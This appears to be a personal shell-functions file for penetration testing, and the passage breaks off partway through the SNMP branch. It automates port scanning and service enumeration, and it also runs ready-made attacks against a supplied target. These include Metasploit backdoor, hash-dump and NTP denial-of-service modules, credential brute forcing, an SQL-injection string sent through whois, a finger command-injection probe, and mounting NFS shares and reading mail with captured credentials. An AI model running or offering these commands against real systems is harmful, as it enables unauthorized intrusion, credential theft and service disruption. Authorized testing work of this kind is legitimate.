# TCP / UDP Port Scanners
portscan() {
  dom=$(openssl rand -hex 4)
  tmux new-session -d -s $dom -n "$1" "source ~/.zshrc; tcp $1; read"
  tmux split-window -v -t $dom "source ~/.zshrc; udp $1; read"
  tmux select-layout -t $dom main-vertical
  tmux resize-pane -t $dom -x 50%
  tmux attach -t $dom
}

tcp(){
    echo -e "\nTCP (TOP-3000) OPEN SCANNING\n"
    sudo nmap -sCV -n -Pn --disable-arp-ping -g 53 -v --top-ports 3000 --open $1 | grep -iE "^\||[0-9]/tcp" --color=never

    echo -e "\nTCP (FULL) SCANNING\n"
    sudo nmap -sCV -n -Pn --disable-arp-ping -g 53 -v -p- --reason $1 | grep -iE "^\||[0-9]/tcp" --color=never

    echo -e "\nNUCLEI NETWORK SCAN\n"
    nuclei -up &>/dev/null && nuclei -ut &>/dev/null
    nuclei -u $1 -t network/
}

udp(){
    echo -e "\nUDP SERVICE SCANNING (TOP 100)\n"
    sudo nmap -sU -n -Pn --disable-arp-ping -g 53 -v --top-ports 100 --open $1 -oX /tmp/$1_UDP.txt | grep -iE "^\||[0-9]/udp" | grep -vE "open\|filtered" --color=never
    udp_ports=$(cat /tmp/$1_UDP.txt | xmlstarlet sel -t -v '//port[state/@state="open"]/@portid' -nl | paste -s -d, -)
    if [[ ! -z $udp_ports ]]; then
        sudo nmap -sUCV -n -Pn --disable-arp-ping -g 53 -p$udp_ports --open $1 | grep -iE "^\||[0-9]/udp" | grep -vE "open\|filtered" --color=never
    else
        echo "NO UDP PORTS FOUND"
    fi
    sudo rm /tmp/$1_UDP.txt

    echo -e "\nUDP FULL BACKGROUND SCANNING\n"
    sudo nmap -sU -n -Pn --disable-arp-ping  -g 53 -v -p- --reason $1 -oX /tmp/$1_UDP.txt | grep -iE "^\||[0-9]/udp" --color=never

    udp_ports=$(cat /tmp/$1_UDP.txt | xmlstarlet sel -t -v '//port[state/@state="open"]/@portid' -nl | paste -s -d, -)
    if [[ ! -z $udp_ports ]]; then
        sudo nmap -sUCV -n -Pn --disable-arp-ping  -g 53 -p$udp_ports --open $1 | grep -iE "^\||[0-9]/udp" | grep -vE "open\|filtered" --color=never
    else
        echo "NO UDP PORTS FOUND"
    fi
    sudo rm /tmp/$1_UDP.txt
}

# Alive Host IP/CIDR Scanning
alive(){
    salt=$(openssl rand -hex 4)
    cidr_regex="^([0-9]{1,3}\.){3}[0-9]{1,3}/([0-9]|[1-2][0-9]|3[0-2])$"
    if [ -f ./$1 ]; then
        echo -e "\n[+] FPING SWEEPING\n"
        fping -q -a < $1 | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' --color=never | awk '{print $1}' | tee -a /tmp/fping_$salt
        cat /tmp/fping_$salt | anew -q alive.txt
        rm /tmp/fping_$salt

        echo -e "\n[+] NMAP PING SWEEPING\n"
        sudo nmap -sn -PE -PM -PP -PS21,22,23,25,80,113,443,31339 -PA80,113,443,10042 -g 53 -iL $1 | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' --color=never > /tmp/nmap_$salt
        cnt=$(cat /tmp/nmap_$salt | wc -l)
        if [[ $cnt == $(cat ./$1 | wc -l) ]]; then
            echo -e "[-] TOO MANY FALSE POSITIVES BY NMAP\n"
        else
            cat /tmp/nmap_$salt
            cat /tmp/nmap_$salt | anew -q alive.txt
        fi

        echo -e "\n[+] NBT SWEEPING\n"
        sudo nbtscan -r -f $1

        echo -e "\n[+] NXC SERVICE SWEEPING\n"
        protocols=("smb" "ldap" "winrm" "rdp" "mssql" "vnc" "wmi" "nfs" "ssh" "ftp")
        for protocol in "${protocols[@]}"; do
            nxc $protocol $1 | awk '{print $1 "  -  " $2 "  -  " $4}' | column -t | grep ^$protocol | tee -a /tmp/nxc_sweep_$salt
            cat /tmp/nxc_sweep_$salt | awk '{print $3}' | anew -q alive.txt
            rm /tmp/nxc_sweep_$salt
        done

        read -r portsweep\?"PERFORM A PORT SWEEP? (Y/N): "
        if [[ $portsweep =~ [Yy] ]]; then
            echo -e "\n[+] TOP 99% TCP SWEEP\n"
            sudo nmap --top-ports 3328 --open -sT -n -Pn --disable-arp-ping -v -T4 -iL $1

            echo -e "\n[+] TOP-25 UDP SWEEP\n"
            udpx -tf $1
        fi
    elif [[ $1 =~ $cidr_regex ]]; then
        net_sz=$((2**$((32 - $(echo $1 | awk -F"/" '{print $2}')))))
    	echo -e "\n[+] FPING SWEEPING\n"
	    fping -a -q -g $1 | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' --color=never | awk '{print $1}' | tee -a /tmp/fping_$salt
        cat /tmp/fping_$salt | anew -q alive.txt
        rm /tmp/fping_$salt

        echo -e "\n[+] NMAP SWEEPING\n"
        sudo nmap -sn -PE -PM -PP -PS21,22,23,25,80,113,443,31339 -PA80,113,443,10042 -g 53 $1 | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' --color=never > /tmp/nmap_$salt
        cnt=$(cat /tmp/nmap_$salt | wc -l)
        if [[ $cnt == $net_sz ]]; then
            echo -e "[-] TOO MANY FALSE POSITIVES BY NMAP\n"
        else
            cat /tmp/nmap_$salt
            cat /tmp/nmap_$salt | anew -q alive.txt
            rm /tmp/nmap_$salt
        fi

        echo -e "\n[+] NBT SWEEPING\n"
        sudo nbtscan -r $1

        echo -e "\n[+] NXC SERVICE SWEEPING\n"
        protocols=("smb" "ldap" "winrm" "rdp" "mssql" "vnc" "wmi" "nfs" "ssh" "ftp")
        for protocol in "${protocols[@]}"; do
            nxc $protocol $1 | awk '{print $1 "  -  " $2 "  -  " $4}' | column -t | grep ^$protocol | tee -a /tmp/nxc_sweep_$salt
            cat /tmp/nxc_sweep_$salt | awk '{print $3}' | anew -q alive.txt
            rm /tmp/nxc_sweep_$salt
        done

        read -r portsweep\?"PERFORM A PORT SWEEP? (Y/N): "
        if [[ $portsweep =~ [Yy] ]]; then
            echo -e "\n[+] TOP 99% TCP SWEEP\n"
            sudo nmap --top-ports 3328 --open -sT -n -Pn --disable-arp-ping -v -T4 $1

            echo -e "\n[+] TOP-25 UDP SWEEP\n"
            udpx -tf $1
        fi
    fi
}

# Listen for ICMP ping
listenping(){
    sudo tcpdump -i tun0 icmp
}

# Network Service Enumerator
scan(){
    if [[ $1 == "ftp" ]]; then
        echo -e "\n[+] NMAP ENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script="ftp-* and not brute" -p$3 $2

        echo -e "\n[+] SSL CERTIFICATE\n"
        sslcert $2 $3 $1

        srvbrute ftp $2 $3
        read -r creds\?"[+] INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
        if [[ ! -z $creds ]]; then
            usr=$(echo $creds | cut -d":" -f1)
            psw=$(echo $creds | cut -d":" -f2)

            read -r resp\?"[+] DO YOU WANT TO DOWNLOAD ALL FILES IN \"./$2_FTP\"? (Y/N)"
            if [[ $resp =~ [Yy]$ ]]; then
                echo -e "\n[+] DOWNLOADING FILES\n"
                mkdir ./$2_FTP && cd ./$2_FTP && wget --mirror --user="$usr" --password="$psw" --no-passive-ftp ftp://$2:$3
                cd ..
            fi
        fi
    fi

    if [[ $1 == "dns" ]]; then
        echo -e "\n[+] NMAP SCANNING\n"
        sudo nmap -Pn -sUV -n --script "(default and *dns*) or dns-nsid or fcrdns or dns-random-txid or dns-random-srcport" -p$3 $2

        echo -e "\n[+] LOCALHOST / SELF PTR RECORDS\n"
        dig -x 127.0.0.1 @$2 +short
        dig -x $2 @$2 +short

            while true; do
            echo -e ""
                read -r dnsdom\?"[+] INPUT A DOMAIN TO ENUMERATE: "
                if [[ ! -z $dnsdom ]]; then
                    rm /tmp/ns_*.txt 2>/dev/null
                    rm /tmp/any_*.txt 2>/dev/null
                    rm /tmp/$dnsdom.txt 2>/dev/null
                    rm /tmp/ns_$dnsdom.txt 2>/dev/null

                    echo $2 > /tmp/ns_$dnsdom.txt

                    echo -e "\n[+] SRV LDAP RECORDS\n"
                    dig SRV _ldap._tcp.dc._msdcs.$dnsdom @$2

                    echo -e "\n[+] REQUESTING \"NS\" RECORDS\n"
                    while read ns_ip; do
                        ns_records=$(dig ns $dnsdom @$ns_ip -p $3 +noall +answer 2>/dev/null | awk '{print $1 "    " $4 "    " $5}' | awk '{printf "%-40s %-8s %s\n", $1, $2, $3}' | grep "$dnsdom\.")
                        if [[ ! -z $ns_records ]]; then
                            echo $ns_records
                            echo $ns_records | awk '{print $3}' | tee -a /tmp/zones_$dnsdom.txt >/dev/null
                            cat /tmp/zones_$dnsdom.txt | sort -u > /tmp/t_$dnsdom.txt && mv /tmp/t_$dnsdom.txt /tmp/zones_$dnsdom.txt
                            while read zone; do
                                if [[ ! -z $(dig a ${zone%.} @$ns_ip -p $3 +short 2>/dev/null) && ! $(dig a ${zone%.} @$2 -p $3 +short 2>/dev/null) == "127.0.0.1" ]]; then
                                    echo $(dig a ${zone%.} @$ns_ip -p $3 +short 2>/dev/null) | tee -a /tmp/ns_$dnsdom.txt >/dev/null
                                    dig a ${zone%.} @$ns_ip -p $3 +noall +answer 2>/dev/null | awk '{print $1 "    " $4 "    " $5}' | awk '{printf "%-40s %-8s %s\n", $1, $2, $3}' | grep "$dnsdom\." --color=never
                                fi
                            done < /tmp/zones_$dnsdom.txt
                        fi
                        cat /tmp/ns_$dnsdom.txt | sort -u > /tmp/t_$dnsdom.txt && mv /tmp/t_$dnsdom.txt /tmp/ns_$dnsdom.txt
                    done < /tmp/ns_$dnsdom.txt

                    echo -e "\n[+] REQUESTING ALL AVAILABLE RECORDS VIA \"ANY\"\n"
                    rm /tmp/any_$dnsdom.txt 2>/dev/null
                    while read ns_ip; do
                        dig any $dnsdom @$ns_ip -p $3 2>/dev/null | grep REFUSED | tee -a /tmp/any_$dnsdom.txt >/dev/null
                        dig any $dnsdom @$ns_ip -p $3 +noall +answer 2>/dev/null | awk '{print $1 "    " $4 "    " $5}' | awk '{printf "%-40s %-8s %s\n", $1, $2, $3}' | grep "$dnsdom\." --color=never | tee -a /tmp/$dnsdom.txt >/dev/null
                    done < /tmp/ns_$dnsdom.txt
                    cat /tmp/$dnsdom.txt | sort -u && rm /tmp/$dnsdom.txt

                    if [[ $(cat /tmp/any_$dnsdom.txt | grep REFUSED | wc -l) == $(cat /tmp/ns_$dnsdom.txt | wc -l) ]]; then
                        echo -e "\n[-] \"ANY\" REQUEST WAS REFUSED BY NAMESERVERS, FETCHING RECORDS MANUALLY\n"

                        echo -e "\n[+] REQUESTING \"A\" RECORDS\n"
                        while read ns_ip; do
                            dig a $dnsdom @$ns_ip -p $3 +noall +answer 2>/dev/null | awk '{print $1 "    " $4 "    " $5}' | awk '{printf "%-40s %-8s %s\n", $1, $2, $3}' | grep "$dnsdom\." --color=never | tee -a /tmp/$dnsdom.txt >/dev/null
                        done < /tmp/ns_$dnsdom.txt
                        cat /tmp/$dnsdom.txt | sort -u && rm /tmp/$dnsdom.txt

                        echo -e "\n[+] REQUESTING \"AAAA\" RECORDS\n"
                        while read ns_ip; do
                            dig aaaa $dnsdom @$ns_ip -p $3 +noall +answer 2>/dev/null | awk '{print $1 "    " $4 "    " $5}' | awk '{printf "%-40s %-8s %s\n", $1, $2, $3}' | grep "$dnsdom\." --color=never | tee -a  /tmp/$dnsdom.txt >/dev/null
                        done < /tmp/ns_$dnsdom.txt
                        cat /tmp/$dnsdom.txt | sort -u && rm /tmp/$dnsdom.txt

                        echo -e "\n[+] REQUESTING \"MX\" RECORDS\n"
                        while read ns_ip; do
                            dig mx $dnsdom @$ns_ip -p $3 +noall +answer 2>/dev/null | awk '{print $1 "    " $4 "    " $5}' | awk '{printf "%-40s %-8s %s\n", $1, $2, $3}' | grep "$dnsdom\." --color=never | tee -a  /tmp/$dnsdom.txt >/dev/null
                        done < /tmp/ns_$dnsdom.txt
                        cat /tmp/$dnsdom.txt | sort -u && rm /tmp/$dnsdom.txt

                        echo -e "\n[+] REQUESTING \"TXT\" RECORDS\n"
                        while read ns_ip; do
                            dig txt $dnsdom @$ns_ip -p $3 +noall +answer 2>/dev/null | awk '{print $1 "    " $4 "    " $5}' | awk '{printf "%-40s %-8s %s\n", $1, $2, $3}' | grep "$dnsdom\." --color=never | tee -a  /tmp/$dnsdom.txt >/dev/null
                        done < /tmp/ns_$dnsdom.txt
                        cat /tmp/$dnsdom.txt | sort -u && rm /tmp/$dnsdom.txt

                        echo -e "\n[+] REQUESTING \"CNAME\" RECORDS\n"
                        while read ns_ip; do
                            dig cname $dnsdom @$ns_ip -p $3 +noall +answer 2>/dev/null | awk '{print $1 "    " $4 "    " $5}' | awk '{printf "%-40s %-8s %s\n", $1, $2, $3}' | grep "$dnsdom\." --color=never | tee -a  /tmp/$dnsdom.txt >/dev/null
                        done < /tmp/ns_$dnsdom.txt 
                        cat /tmp/$dnsdom.txt | sort -u && rm /tmp/$dnsdom.txt

                        echo -e "\n[+] REQUESTING \"SOA\" RECORDS\n"
                        while read ns_ip; do
                            dig soa $dnsdom @$ns_ip -p $3 +noall +answer 2>/dev/null | awk '{print $1 "    " $4 "    " $5}' | awk '{printf "%-40s %-8s %s\n", $1, $2, $3}' | grep "$dnsdom\." --color=never | tee -a  /tmp/$dnsdom.txt >/dev/null
                        done < /tmp/ns_$dnsdom.txt
                        cat /tmp/$dnsdom.txt | sort -u && rm /tmp/$dnsdom.txt

                        echo -e "\n[+] REQUESTING \"HINFO\" RECORDS\n"
                        while read ns_ip; do
                            dig hinfo $dnsdom @$ns_ip -p $3 +noall +answer 2>/dev/null | awk '{print $1 "    " $4 "    " $5}' | awk '{printf "%-40s %-8s %s\n", $1, $2, $3}' | grep "$dnsdom\." --color=never | tee -a  /tmp/$dnsdom.txt >/dev/null
                        done < /tmp/ns_$dnsdom.txt
                        cat /tmp/$dnsdom.txt | sort -u && rm /tmp/$dnsdom.txt
                    fi

                    echo -e "\n[+] ATTEMPTING ZONE TRANSFER\n"
                    while read ns_ip; do
                        dig axfr $dnsdom @$ns_ip -p $3 +noall +answer 2>/dev/null | awk '{print $1 "    " $4 "    " $5}' | awk '{printf "%-40s %-8s %s\n", $1, $2, $3}' | grep "$dnsdom\." --color=never | tee -a  /tmp/$dnsdom.txt >/dev/null
                    done < /tmp/ns_$dnsdom.txt
                    cat /tmp/$dnsdom.txt | sort -u

                    if [[ ! -s /tmp/$dnsdom.txt ]]; then
                        rm /tmp/$dnsdom.txt
                        echo -e ""
                        read -r brute\?"[+] ZONE TRANSFER FAILED, BRUTEFORCING SUBDOMAINS? (Y/N): "
                        if [[ $brute =~ [yY] ]]; then
                            cur=$(pwd) && cd /home/damuna/tools/subbrute
                            python2 subbrute.py $dnsdom -s /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r /tmp/ns_$dnsdom.txt
                            python2 subbrute.py $dnsdom -s /usr/share/seclists/Discovery/DNS/namelist.txt -r /tmp/ns_$dnsdom.txt
                            python2 subbrute.py $dnsdom -s /usr/share/seclists/Discovery/DNS/sortedcombined-knock-dnsrecon-fierce-reconng.txt -r /tmp/ns_$dnsdom.txt
                            python2 subbrute.py $dnsdom -s /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -r /tmp/ns_$dnsdom.txt
                            cd $cur
                        fi
                    else
                        echo -e "\n[+] DOMAINS WITH IP RECORDS FOUND BY ZONE TRANSFER\n"
                        cat /tmp/$dnsdom.txt | grep -E '([0-9]{1,3}\.){3}[0-9]{1,3}|([0-9a-fA-F]{0,4}:){2,7}[0-9a-fA-F]{0,4}' | grep -vE ^$dnsdom --color=never
                        rm /tmp/$dnsdom.txt
                    fi
                fi
            done
    fi

    if [[ $1 == "ssh" ]]; then
        echo -e "\n[+] CHECKING VERSION + AUTH METHODS\n"
        sudo nmap -n -Pn -v -sV --script "ssh-auth-methods" --script-args="ssh.user=root" -p$3 $2

        echo -e "\n[+] LAUNCHING SSH-AUDIT\n"
        ssh-audit --port $3 $2

        echo -e "\n[+] MSF BACKDOOR CHECKS\n"
        msfconsole -q -x "use auxiliary/scanner/ssh/libssh_auth_bypass; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ssh/juniper_backdoor; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ssh/fortinet_backdoor; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ssh/eaton_xpert_backdoor; set RHOSTS $2; set RPORT $3; exploit; exit"

        srvbrute ssh $2 $3
    fi

    if [[ $1 == "telnet" ]]; then
        echo -e "\n[+] ENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script "telnet-* and not brute" -p$3 $2

        echo -e "\n[+] MSF BROCADE / TELNET ATTACKS\n"
        msfconsole -q -x "use auxiliary/scanner/telnet/brocade_enable_login; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/telnet/telnet_encrypt_overflow; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/telnet/telnet_ruggedcom; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/telnet/satel_cmd_exec; set RHOSTS $2; set RPORT $3; exploit; exit"
        
        srvbrute telnet $2 $3
    fi

    if [[ $1 == "vmware" ]]; then
        echo -e "\n[+] NMAP ENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script "http-vmware-path-vuln or vmware-version" -p$3 $2

        echo -e "\n[+] MSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/vmware/esx_fingerprint; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/vmware/vmauthd_version; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/vmware/vmware_server_dir_trav; set RHOSTS $2; set RPORT $3; exploit; exit"     
        msfconsole -q -x "use auxiliary/scanner/vmware/vmware_update_manager_traversal; set RHOSTS $2; set RPORT $3; exploit; exit"
    fi

    if [[ $1 == "smtp" ]]; then
        echo -e "\n[+] NMAP ENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script=smtp-commands,smtp-ntlm-info,smtp-open-relay,smtp-strangeport,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p$3 $2

        echo -e "\n[+] CERTIFICATE DATA\n"
        sslcert $2 $3 $1

        read -r mtd\?"[+] INPUT METHOD FOR USER BRUTEFORCING (BLANK TO SKIP): "
        if [[ ! -z $mtd ]]; then
            read -r dom\?"[+] INPUT A DOMAIN IF PRESENT: "

            echo -e "\n[+] BRUTEFORCING E-MAIL ADDRESSES ON \"$dom\"\n"
            smtp-user-enum -M $mtd -U /usr/share/seclists/Usernames/Names/names.txt -f kali@$dom -t $2 -p $3 -w 15 -D $dom
            smtp-user-enum -M $mtd -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -f kali@$dom -t $2 -p $3 -w 15 -D $dom

            echo -e "\n[+] BRUTEFORCING LOCAL USERS ON \"$2:$3\"\n"
            smtp-user-enum -M $mtd -U /usr/share/seclists/Usernames/Names/names.txt -t $2 -p $3 -w 15
            smtp-user-enum -M $mtd -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t $2 -p $3 -w 15
        else
            echo -e "\n[+] BRUTEFORCING LOCAL USERS ON \"$2:$3\"\n"
            smtp-user-enum -M $mtd -U /usr/share/seclists/Usernames/Names/names.txt -t $2 -p $3 -w 15
            smtp-user-enum -M $mtd -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t $2 -p $3 -w 15
        fi

        echo -e "\n[+] MSF VERSION FINGERPRINT\n"
        msfconsole -q -x "use auxiliary/scanner/smtp/smtp_version; set RHOSTS $2; set RPORT $3; exploit; exit"

        srvbrute smtp $2 $3
    fi

    if [[ $1 == "whois" ]]; then
        echo -e "\n[+] ENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script="whois-* and not brute" -p$3 $2

        echo -e "\n[+] TESTING SQL INJECTION\n"
        whois -h $2 -p $3 "a') or 1=1#"

        read -r whois_dom\?"[+] INPUT DOMAIN TO QUERY (BLANK TO SKIP): "
        if [[ ! -z $whois_dom ]]; then
            whois -h $2 -p $3 "$whois_dom"
        fi
    fi

    if [[ $1 == "psql" ]]; then
        echo -e "\n[+] MSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/postgres/postgres_version; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/postgres/postgres_dbname_flag_injection; set RHOST $2; set RPORT $3; run"

        echo -e "\n[+] CERTIFICATE DATA\n"
        sslcert postgres $2 $3

        srvbrute postgres $2 $3
        read -r creds\?"[+] INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
        if [[ ! -z $creds ]]; then
            user=$(echo $creds | cut -d":" -f1)
            password=$(echo $creds | cut -d":" -f2)

            echo -e "\n[+] MSF HASH DUMPING\n"
            msfconsole -q -x "use auxiliary/scanner/postgres_hashdump; set USERNAME $user; set PASSWORD $password; set RHOSTS $2; set RPORT $3; exploit; exit"

            echo -e "\n[+] ATTEMPTING LOGIN\n"
            PGPASSWORD=$password psql -p $3 -h $2 -U $user
        fi
    fi

    if [[ $1 == "tftp" ]]; then
        echo -e "\n[+] ENUMERATION\n"
        sudo nmap -n -Pn  -v -sUV --script="tftp-enum" -p$3 $2

        echo -e "\n[+] MSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/tftp/ipswitch_whatsupgold_tftp; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/tftp/netdecision_tftp; set RHOSTS $2; set RPORT $3; exploit; exit"

        echo -e "\n[+] TESTING DEFAULT CREDENTIALS\n"
        msfconsole -q -x "use auxiliary/scanner/tftp/tftpbrute; set RHOST $2; set RPORT $3; set THREADS 10; run"
    fi

    if [[ $1 == "finger" ]]; then
        echo -e "\n[+] GRABBING ROOT BANNER\n"
        echo root | nc -vn $2 $3

        echo -e "\n[+] NMAP ENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script=finger -p$3 $2

        echo -e "\n[+] TESTING \"/bin/id\" INJECTION\n"
        finger "|/bin/id@$2"

        echo -e "\n[+] ENUMERATING USERS (XATO-NET)\n"
        msfconsole -q -x "use auxiliary/scanner/finger/finger_users; set RHOSTS $2; set RPORT $3; set USERS_FILE /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt; exploit; exit"
    fi

    if [[ $1 == "portmap" ]]; then
        echo -e "\n[+] DISPLAYING RPC INFO\n"
        rpcinfo $2

        echo -e "\n[+] CHECKING USER LISTINGS\n"
        rusers -l $2

        echo -e "\n[+] MSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/portmap/portmap_amp; set RHOSTS $2; set RPORT $3; exploit; exit"

        read -r resp\?"[+] INPUT A VALID NIS DOMAIN (BLANK TO SKIP): "
        if [[ ! -z $resp ]]; then
            echo -e "\n[+] DUMPING INFORMATION\n"
            ypwhich -d $resp $2
            ypcat -d $resp -h $2 passwd.byname
            ypcat -d $resp -h $2 group.byname
            ypcat -d $resp -h $2 hosts.byname
            ypcat -d $resp -h $2 mail.aliases
        fi
    fi

    if [[ $1 == "pop3" ]]; then
        echo -e "\n[+] BANNER GRABBING\n"
        echo "quit" | nc -vn $2 $3

        echo -e "\n[+] NMAP ENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script "pop3-* and not brute" -p$3 $2

        echo -e "\n[+] CERTIFICATE DATA\n"
        sslcert $2 $3 $1

        echo -e "\n[+] MSF FINGERPRINT\n"
        msfconsole -q -x "use auxiliary/scanner/pop3/pop3_version; set RHOSTS $2; set RPORT $3; exploit; exit"

        srvbrute pop3 $2 $3
        read -r cred\?"[+] INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): " 
        if [[ ! -z $cred ]]; then
            usr=$(echo $cred | cut -d":" -f1)
            psw=$(echo $cred | cut -d":" -f2)
           
            echo -e "\n[+] LISTING MESSAGES\n"
            curl -u "$usr:$psw" -s pop3://$2:$3

            while true; do read -r msg\?"[+] INPUT MESSAGE TO RETRIEVE: " && curl -u "$usr:$psw" -s pop3://$2:$3/$msg; done
        fi

    fi

    if [[ $1 == "nfs" ]]; then
        echo -e "\n[+] CHECKING SHARES / ROOT ESCAPING\n"
        nxc nfs $2 --port $3 --enum-shares 5

        read -r shr\?"[+] INPUT SHARE PATH TO MOUNT (BLANK TO SKIP): "
        if [[ ! -z $shr ]]; then
            echo -e "\n[+] MOUNTING TO \"/mnt/$2$shr\"\n"
            sudo mkdir -p /mnt/$2$shr && sudo mount -t nfs -o nolock -o port=$3 $2:$shr /mnt/$2$shr && sudo ls -la /mnt/$2$shr
        fi

        echo -e "\nCOPYING CONTENT INTO \"$2_$(echo $shr | tr '/' '_')\"\n"
        sudo cp -r /mnt/$2$shr ./$2$(echo $shr | tr '/' '_')
        sudo chmod -R +r ./$2$(echo $shr | tr '/' '_')
    fi

    if [[ $1 == "ident" ]]; then
        read -r portlist\?"[+] INPUT COMMA-SEPARATED OPEN PORTS: "

        echo -e "\n[+] ENUMERATING USERS OF SUPPLIED PORTS\n"
        echo $portlist | tr ',' '\n' | while read port; do ident-user-enum $2 $3 $port; done
    fi

    if [[ $1 == "ntp" ]]; then
        echo -e "\n[+] NMAP ENUMERATION\n"
        sudo nmap -sUV -sV --script "ntp-info or ntp-monlist" -p$3 $2

        echo -e "\n[+] REQUESTING METHODS\n"
        ntpq -c readlist $2
        ntpq -c readvar $2
        ntpq -c associations $2
        ntpq -c peers $2
        ntpd -c monlist $2
        ntpd -c listpeers $2
        ntpd -c sysinfo $2

        echo -e "\n[+] MSF DOS CHECKS\n"
        msfconsole -q -x "use auxiliary/scanner/ntp/ntp_peer_list_dos; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ntp/ntp_peer_list_sum_dos; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ntp/ntp_req_nonce_dos; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ntp/ntp_reslist_dos; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ntp/ntp_unsettrap_dos; set RHOSTS $2; set RPORT $3; exploit; exit"
    fi

    if [[ $1 == "snmp" ]]; then 
        echo -e "\n[+] FINGERPRINTING VERSION\n"
        sudo nmap -n -Pn -sUV --script "snmp-info" -p$3 $2

        read -r snmp_ver\?"[+] INPUT SNMP VERSION (1, 2c, 3): "
        if [[ $snmp_ver == "3" ]]; then
            echo -e "\n[+] BRUTEFORCING CREDENTIALS\n"
            echo "$2:$3" > /tmp/$2_host.txt
            cur=$(pwd) && cd /home/damuna/tools/snmpwn && ./snmpwn.rb -u /home/damuna/wordlists/DEFAULT_CREDENTIALS/default_users.txt -p /home/damuna/wordlists/DEFAULT_CREDENTIALS/default_pass.txt --enclist /home/damuna/wordlists/DEFAULT_CREDENTIALS/default_pass.txt -h /tmp/$2_host.txt && cd $cur

            echo ""; read -r snmp_data\?"[+] INPUT A VALID \"USER:PASS\" COMBINATION (CTRL-C IF NONE): "
            usr=$(echo $snmp_data | cut -d':' -f1)
            pass=$(echo $snmp_data | cut -d':' -f2)

            read -r snmp_os\?"[+] INPUT OPERATING SYSTEM (lin, win): "
            if [[ $snmp_os == "win" ]]; then
                echo -e "\n[+] EXTRACING USERS\n"
                snmpwalk -mAll -r 2 -t 10 -v3 -l authPriv -u $usr -a SHA -A "$pass" -x AES -X "$pass" $2:$3 1.3.6.1.4.1.77.1.2.25

                echo -e "\n[+] EXTRACTING PROCESSES\n"
                snmpwalk -mAll -r 2 -t 10 -v3 -l authPriv -u $usr -a SHA -A "$pass" -x AES -X "$pass" $2:$3 1.3.6.1.2.1.25.4.2.1.2

                echo -e "\n[+] EXTRACTING INSTALLED SOFTWARE\n"
                snmpwalk -mAll -r 2 -t 10 -v3 -l authPriv -u $usr -a SHA -A "$pass" -x AES -X "$pass" $2:$3 1.3.6.1.2.1.25.6.3.1.2

                echo -e "\n[+] EXTRACING LOCAL PORTS\n"
                snmpwalk -mAll -r 2 -t 10 -v3 -l authPriv -u $usr -a SHA -A "$pass" -x AES -X "$pass" $2:$3 1.3.6.1.2.1.6.13.1.3
            fi

            echo -e "\n[+] DUMPING FULL MIB DATA IN \"$2_SNMPWALK.txt\"\n"
            snmpwalk -mAll -r 2 -t 10 -v3 -l authPriv -u $usr -a SHA -A "$pass" -x AES -X "$pass" $2:$3 NET-SNMP-EXTEND-MIB::nsExtendOutputFull | tee > $2_SNMPWALK.txt

            echo -e "\n[+] GREPPING FOR PRIVATE STRINGS\n"
            cat $2_SNMPWALK.txt | grep -i "trap\|login\|fail"

            echo -e "\n[+] GREPPING USERNAMES/PASSWORDS DATA\n"
            cat $2_SNMPWALK.txt | grep -i "login\|fail"

            echo -e "\n[+] GREEPING IPv6 ADDRESSES\n"
            cat $2_SNMPWALK.txt | grep -i 'ipv6\.' | cut -d '"' -f2 | sed -E 's/(.{2}):(.{2})/\1\2/g'

            echo -e "\n[+] GREPPING IPv4 ADDRESSES\n"
            cat $2_SNMPWALK.txt | grep -i 'ipv4\.' | cut -d '"' -f2

            echo -e "\n[+] GREPPING FOR EMAILS\n"
            grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" $2_SNMPWALK.txt
        else
            echo -e "\n[+] SEARCHING VALID COMMUNITY STRINGS\n"
            onesixtyone -p $3 -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt $2
